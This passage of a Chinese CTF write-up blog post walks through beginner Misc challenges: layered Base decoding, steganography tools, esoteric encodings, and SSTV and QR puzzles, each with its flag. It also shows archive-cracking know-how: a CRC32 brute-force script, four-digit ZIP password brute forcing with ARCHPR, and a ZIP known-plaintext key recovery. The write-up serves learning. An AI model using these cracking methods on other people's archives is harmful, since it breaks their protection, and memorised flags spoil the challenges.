class=\"code\"><pre><span class=\"line\">3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW</span><br></pre></td></tr></table></figure>\n\n<p><strong>base58解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5</span><br></pre></td></tr></table></figure>\n\n<p><strong>base32解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=</span><br></pre></td></tr></table></figure>\n\n<p><strong>base64解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d</span><br></pre></td></tr></table></figure>\n\n<p><strong>hex解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;y0u_alr3ady_kn0w_th3_Basefam1ly&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SlientEye\"><a href=\"#SlientEye\" class=\"headerlink\" title=\"SlientEye\"></a>SlientEye</h2><p>根据题目直接百度<strong>SlientEye</strong>，下载以后打开图片–&gt;decode：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130105145.png\"></p>\n<p>参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">&amp;#102;</span><span class=\"symbol\">&amp;#108;</span><span class=\"symbol\">&amp;#97;</span><span class=\"symbol\">&amp;#103;</span><span class=\"symbol\">&amp;#123;</span><span class=\"symbol\">&amp;#110;</span><span class=\"symbol\">&amp;#49;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#98;</span><span class=\"symbol\">&amp;#117;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#106;</span><span class=\"symbol\">&amp;#49;</span><span class=\"symbol\">&amp;#97;</span><span class=\"symbol\">&amp;#110;</span><span class=\"symbol\">&amp;#103;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#119;</span><span class=\"symbol\">&amp;#117;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#100;</span><span class=\"symbol\">&amp;#51;</span><span class=\"symbol\">&amp;#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>再去百度搜到一篇博客：<a href=\"https://www.cnblogs.com/philipding/p/10153094.html\">&amp;#x开头的是什么编码?</a>，<del>我点开一看，哦，原来是</del>entity code实体编码，<del>我啪的一下就</del>把flag.txt改为flag.html，<del>很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳</del>打开flag.html获得flag：<strong>flag{n1_bu_j1ang_wu_d3}</strong></p>\n<h2 id=\"编码之王\"><a href=\"#编码之王\" class=\"headerlink\" title=\"编码之王\"></a>编码之王</h2><p>下载文件打开后一堆社会主义核心价值观，前面提到的：<a href=\"http://ctf.ssleye.com/\">CTF在线工具</a>就有核心价值观编码，下面放密文，上面是解码内容。</p>\n<p>解出来以后看到第一句：<code>如是我闻:</code>，–&gt;<a href=\"http://www.keyfc.net/bbs/tools/tudoucode.aspx\">与佛论禅</a></p>\n<p>再解之后看第一句：<code>新佛曰：</code>。–&gt;<a href=\"http://hi.pcmoe.net/buddha.html\">新与佛论禅</a></p>\n<p>解完以后直接出了一堆由：<code>[、]、!、+、(、)</code>组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130110943.png\"></p>\n<h2 id=\"jpgsteg\"><a href=\"#jpgsteg\" class=\"headerlink\" title=\"jpgsteg\"></a>jpgsteg</h2><p>题目即是用到的工具，百度下载软件，使用jphide.exe打开图片<code>Tap code.jpg</code>，选择seek功能解密，密码为123456（我蒙的）：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111311.png\"></p>\n<p>成功解密后获得一个文档，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">... ....</span><br><span class=\"line\">.. ...</span><br><span class=\"line\">.. ...</span><br><span class=\"line\">. .</span><br><span class=\"line\">... ..</span><br><span class=\"line\">. .</span><br><span class=\"line\">..... .....</span><br><span class=\"line\">.. ....</span><br><span class=\"line\">... ...</span><br><span class=\"line\">.. ..</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的<code>.</code>分成两部分代表坐标</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111538.png\"></p>\n<p>解码得到：<code>ohhamazing</code> ，加上括号就是：<strong>flag{ohhamazing}</strong></p>\n<p>事后多看了一眼图片命名：<code>Tap code.jpg</code>。这用啥解密不就在脸上写着的<del>wosabi \\0/</del>。。。</p>\n<h2 id=\"Collision\"><a href=\"#Collision\" class=\"headerlink\" title=\"Collision\"></a>Collision</h2><p>打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201102424.png\"></p>\n<p>所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：<a href=\"https://blog.csdn.net/weixin_45396639/article/details/103393759\">crc32碰撞 ctf python</a>作者原创的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crc</span>(<span class=\"params\">_crc</span>):</span></span><br><span class=\"line\">    l = <span class=\"number\">1</span></span><br><span class=\"line\">    dic = string.printable</span><br><span class=\"line\">    _<span class=\"built_in\">input</span> = _crc</span><br><span class=\"line\">    _<span class=\"built_in\">input</span> = <span class=\"string\">&quot;0X&quot;</span> + _<span class=\"built_in\">input</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                    s = i + n + h + m</span><br><span class=\"line\">                    s = s.encode()</span><br><span class=\"line\">                    <span class=\"comment\"># print(str(binascii.crc32(s)), _input)</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">hex</span>(binascii.crc32(s)).upper() == _<span class=\"built_in\">input</span>.upper():</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(_crc, <span class=\"string\">&#x27;:&#x27;</span>, s.decode())</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(l)</span><br><span class=\"line\">                        sys.exit()  <span class=\"comment\">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class=\"line\">                    l = l + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crc32</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class=\"line\">    num = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class=\"line\">    _thread = []</span><br><span class=\"line\">    _args = []</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;输入参数&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i+<span class=\"number\">1</span>, end=<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        _args.append(<span class=\"built_in\">input</span>())</span><br><span class=\"line\">    <span class=\"comment\"># print(_args)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class=\"line\">        _thread.append(t) <span class=\"comment\">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class=\"line\">    <span class=\"comment\"># print(_thread)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        _thread[i].start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        _thread[i].join()</span><br><span class=\"line\">    <span class=\"built_in\">input</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    crc32()</span><br></pre></td></tr></table></figure>\n\n<p>使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ff92876d</span><br><span class=\"line\">6c4a558b</span><br><span class=\"line\">77e8fd00</span><br><span class=\"line\">1e59a66e</span><br><span class=\"line\">d1f4eb9a</span><br></pre></td></tr></table></figure>\n\n<p>碰撞以后获得的明文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1on&#125;</span><br><span class=\"line\">32co</span><br><span class=\"line\">llis</span><br><span class=\"line\">flag</span><br><span class=\"line\">&#123;crc</span><br></pre></td></tr></table></figure>\n\n<p>根据flag的结构拼接一下：<strong>flag{crc32collis1on}</strong></p>\n<h2 id=\"kaomoji\"><a href=\"#kaomoji\" class=\"headerlink\" title=\"kaomoji\"></a>kaomoji</h2><p>题目的压缩包解压以后得到一个<strong>flag.zip</strong>压缩包和<strong>secret.txt</strong>，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用<strong>winrar</strong>压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201103227.png\"></p>\n<p>配合ARCHPR使用明文攻击，获得加密密钥： <strong>[b00df998 5bdbbde6 485fa1f8]</strong></p>\n<p>我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包<strong>flag_decrypted.zip</strong>，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}</p>\n<h2 id=\"ARCHPR\"><a href=\"#ARCHPR\" class=\"headerlink\" title=\"ARCHPR\"></a>ARCHPR</h2><p>题目根据提示：<strong>This file was encrypted by me with a four-digit password, try to crack it!</strong></p>\n<p>密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.</span><br><span class=\"line\"></span><br><span class=\"line\">key: .--. .- ... ... .-- --- .-. -..</span><br></pre></td></tr></table></figure>\n\n<p>提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：<code>password</code>，使用LSB（<a href=\"https://github.com/livz/cloacked-pixel\">项目地址</a>）脚本执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python lsb.py extract flag.png 1.txt password</span><br></pre></td></tr></table></figure>\n\n<p><strong>1.txt</strong>中就包含了解密以后的flag：<strong>flag{th1s_15_f1agggggg}</strong></p>\n<h2 id=\"outguess\"><a href=\"#outguess\" class=\"headerlink\" title=\"outguess\"></a>outguess</h2><p>​    看题目找工具，使用outguess参考<a href=\"https://blog.csdn.net/weixin_43877387/article/details/103123858\">隐写工具outguess 的下载安装及使用</a>，在kali中安装以后执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outguess -r flag.jpg hide.txt</span><br></pre></td></tr></table></figure>\n\n<p>获得hide.txt文件的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg!</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Encrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+</span><br></pre></td></tr></table></figure>\n\n<p>上面一段使用<strong>凯撒密码</strong>移动13位获得：<strong>Do you know AES? The key is s3cur1ty, go and crack it!</strong></p>\n<p>其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是<code>s3cur1ty</code>，获得flag：<strong>flag{y0u_ar3_awes0m3}</strong></p>\n<p>解密网站：<a href=\"https://tool.oschina.net/encrypt\">https://tool.oschina.net/encrypt</a></p>\n<h2 id=\"Whitespace\"><a href=\"#Whitespace\" class=\"headerlink\" title=\"Whitespace\"></a>Whitespace</h2><p>题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201104847.png\"></p>\n<p>这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。</p>\n<p>在<a href=\"https://vii5ard.github.io/whitespace\">whitespace</a>网站中粘贴密文点上面的<code>run</code>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105235.png\"></p>\n<p>解密获得：<strong>password is BlindWaterMark!</strong></p>\n<p>输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Do you see any difference between the two pictures?</span><br><span class=\"line\">Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">上传文档</span><br><span class=\"line\">你看这两幅画有什么不同吗？</span><br><span class=\"line\">了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。</span><br></pre></td></tr></table></figure>\n\n<p>根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了<strong>盲水印</strong>技术，使用盲水印解密图片，项目地址：<a href=\"https://github.com/chishaxie/BlindWaterMark%EF%BC%8C%E6%89%A7%E8%A1%8C%EF%BC%9A\">https://github.com/chishaxie/BlindWaterMark，执行：</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python bwn.py decode 2.png 1.png 3.png </span><br></pre></td></tr></table></figure>\n\n<p>获得解密图片：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105728.png\"></p>\n<p>图片中的内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">296969a5695</span><br><span class=\"line\">6696a6a9a69</span><br><span class=\"line\">5669595a566</span><br><span class=\"line\">965696666aa</span><br><span class=\"line\">69596a9666a</span><br><span class=\"line\">a6a6569955a</span><br><span class=\"line\">5a66aa69a56</span><br><span class=\"line\">9566a6a6aa6</span><br></pre></td></tr></table></figure>\n\n<p>就百度曼切斯特编码解码，找到一篇博客：<a href=\"https://blog.csdn.net/weixin_30416871/article/details/98566881\">一些CTF编码脚本</a>，在里面找到了这两段：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105901.png\"></p>\n<p>心里一顿狂喜，因为都是<code>2965a</code>这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">s = &#x27;296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6&#x27;  #这是前面图片里的内容</span><br><span class=\"line\"></span><br><span class=\"line\">s=bin(int(s,16))</span><br><span class=\"line\">r=&quot;&quot;</span><br><span class=\"line\">for i in range(len(s)/2):</span><br><span class=\"line\">    if s[i*2:i*2+2] == &#x27;10&#x27;:</span><br><span class=\"line\">        r += &#x27;1&#x27;</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        r += &#x27;0&#x27;</span><br><span class=\"line\">print hex(int(r,2))[2:-1].decode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>执行脚本后获得flag：<strong>flag{ab1de_by_th3_law}</strong></p>\n<h2 id=\"Steghide\"><a href=\"#Steghide\" class=\"headerlink\" title=\"Steghide\"></a>Steghide</h2><p>题目即工具。参考博客<a href=\"https://www.jianshu.com/p/c3679f805a0c\">隐写工具Steghide</a>，在kali中安装Steghide后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">steghide.exe extract -sf trump.jpg</span><br></pre></td></tr></table></figure>\n\n<p>会提示<code>Enter passphrase:</code>直接回车表示空密码，获得flag.txt，打开以后里面都是由<code>¿ ¡ .</code>组成的密文，和<strong>Ook</strong>的另一种编码：<strong>short Ook</strong>类似也是只用<code>? ! .</code>组成，把叹号和问号全部替换反过来<code>¡---&gt;!  ¿---&gt;?</code>，替换之后在线解码：<a href=\"https://www.splitbrain.org/services/ook%EF%BC%8C%E8%8E%B7%E5%BE%97flag%EF%BC%9A**flag%7By0u_ar3_clev3r%7D\">https://www.splitbrain.org/services/ook，获得flag：**flag{y0u_ar3_clev3r}</a>**</p>\n<h2 id=\"SSTV\"><a href=\"#SSTV\" class=\"headerlink\" title=\"SSTV\"></a>SSTV</h2><p>题目既是工具。搜索SSTV百度百科：</p>\n<blockquote>\n<p>慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。</p>\n</blockquote>\n<p>了解到是一种无线电传递图片的方法，搜到的博客<a href=\"https://blog.csdn.net/zkf0100007/article/details/83387790\">慢扫描电视 SSTV</a>和B站的视频<a href=\"https://www.bilibili.com/video/BV1ea4y1J787\">慢扫描电视SSTV</a>，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：<strong>DMCTF{SSTV,yyds?}</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201111538.png\"></p>\n<h2 id=\"SimpleQrcode\"><a href=\"#SimpleQrcode\" class=\"headerlink\" title=\"SimpleQrcode\"></a>SimpleQrcode</h2><p>​    下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DM</span><br><span class=\"line\">CT</span><br><span class=\"line\">F&#123;</span><br><span class=\"line\">Qr</span><br><span class=\"line\">Co</span><br><span class=\"line\">de</span><br><span class=\"line\">_1</span><br><span class=\"line\">s_</span><br><span class=\"line\">so</span><br><span class=\"line\">_i</span><br><span class=\"line\">nt</span><br><span class=\"line\">er</span><br><span class=\"line\">es</span><br><span class=\"line\">ti</span><br><span class=\"line\">ng</span><br><span class=\"line\">!!</span><br><span class=\"line\">!&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考下题目标题和flag格式，拼接后获得flag：<strong>DMCTF{QrCode_1s_so_interesting!!!}</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这次比赛是第一次做Mics的题awa。</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"Check-in\"><a href=\"#Check-in\" class=\"headerlink\" title=\"Check_in\"></a>Check_in</h2><p>真·有手就行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130102716.png\"></p>\n<h2 id=\"fakezip\"><a href=\"#fakezip\" class=\"headerlink\" title=\"fakezip\"></a>fakezip</h2><p>看到题目<strong>fakezip</strong>翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：<a href=\"https://blog.csdn.net/u011377996/article/details/79286958\">zip伪加密</a>，使用010 Editor打开压缩包，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130103932.png\"></p>\n<p>找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt</p>\n<p>打开以后内容是：<code>♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=</code>，音符加密虽然是第一次听说，但是百度还是可以简单找到：<a href=\"https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue\">文本加密为音乐符号</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130104321.png\"></p>\n<h2 id=\"Base-family\"><a href=\"#Base-family\" class=\"headerlink\" title=\"Base family\"></a>Base family</h2><p>题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：<code>base16</code>、<code>base32</code>、<code>base58</code>、<code>base64</code>、<code>base91</code>。还有几种没听过的base种类可以在这个网站找到：<a href=\"http://ctf.ssleye.com/\">CTF在线工具</a>。</p>\n<p><strong>原层</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XUZbB&#123;fp&#125;U)=ql[n%GCbk9RZ7!XD$D)f1G&#123;011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I&#125;^8jjP|0&amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&quot;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;duRBGj`g0!I+xjm(fh)]IF:&gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu&#125;%_=&lt;D</span><br></pre></td></tr></table></figure>\n\n<p><strong>base91解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW</span><br></pre></td></tr></table></figure>\n\n<p><strong>base58解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 